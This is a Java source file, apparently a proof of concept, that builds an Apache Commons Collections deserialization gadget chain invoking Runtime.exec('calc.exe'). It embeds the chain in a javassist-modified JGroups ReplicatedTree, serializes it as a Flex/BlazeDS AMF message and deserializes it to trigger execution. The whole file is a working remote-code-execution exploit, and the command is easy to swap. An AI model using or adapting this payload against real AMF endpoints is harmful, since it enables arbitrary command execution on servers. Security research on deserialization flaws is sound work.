
import flex.messaging.io.SerializationContext;
import flex.messaging.io.amf.*;

import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import org.jgroups.blocks.ReplicatedTree;


import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.util.*;

public class Test1 {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.get("org.jgroups.blocks.ReplicatedTree");
        CtClass ctClass1 = pool.get("byte[]");
        CtField ctField = new CtField(ctClass1, "state", ctClass);
        ctClass.addField(ctField);

        ctClass.removeMethod(ctClass.getDeclaredMethod("getState"));
        CtMethod ctMethod = CtNewMethod.make("public byte[] getState(){ return this.state; }", ctClass);
        ctClass.addMethod(ctMethod);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(getObject2("calc.exe"));
        objectOutputStream.close();

        byte[] secondObj = byteArrayOutputStream.toByteArray();

        ReplicatedTree replicatedTree = (ReplicatedTree) ctClass.toClass().getConstructor().newInstance();
        Field f1 = replicatedTree.getClass().getDeclaredField("state");
        f1.setAccessible(true);
        f1.set(replicatedTree, secondObj);

        byte[] ser = serialize(replicatedTree);

        FileOutputStream fileOutputStream = new FileOutputStream("emp.ser");
        fileOutputStream.write(ser);
        fileOutputStream.close();
        byte[] serContent = Files.readAllBytes((new File("emp.ser")).toPath());
        deserialize(serContent);

    }
    public static byte[] serialize(Object data) throws IOException {
        MessageBody body = new MessageBody();
        body.setData(data);

        ActionMessage message = new ActionMessage();
        message.addBody(body);

        ByteArrayOutputStream out = new ByteArrayOutputStream();

        AmfMessageSerializer serializer = new AmfMessageSerializer();
        serializer.initialize(SerializationContext.getSerializationContext(), out, null);
        serializer.writeMessage(message);

        return out.toByteArray();
    }

    public static void deserialize(byte[] amf) throws ClassNotFoundException, IOException {
        ByteArrayInputStream in = new ByteArrayInputStream(amf);

        AmfMessageDeserializer deserializer = new AmfMessageDeserializer();
        deserializer.initialize(SerializationContext.getSerializationContext(), in, null);
        deserializer.readMessage(new ActionMessage(), new ActionContext());
    }


    public static Serializable getObject2(final String command) throws Exception {

        final String[] execArgs = new String[] { command };

        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };

        Transformer transformerChain = new ChainedTransformer(transformers);

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        return map;

    }


}
